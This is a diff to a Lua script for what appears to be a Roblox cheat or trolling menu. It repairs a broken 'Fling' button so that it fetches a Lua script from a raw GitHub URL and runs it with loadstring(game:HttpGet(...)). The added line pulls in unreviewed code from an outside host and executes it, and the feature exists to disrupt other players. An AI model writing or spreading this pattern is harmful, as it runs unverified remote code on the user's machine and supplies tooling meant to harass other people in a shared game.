@@ -1524,7 +1524,7 @@ TrollTab:CreateButton({
     Name = "Fling",
     Callback = function()
         task.spawn(function()
-            pcall(function() "))() end)
+            pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/surrre4l/bruh/main/exe.lua.txt"))() end)
         end)
     end,
 })
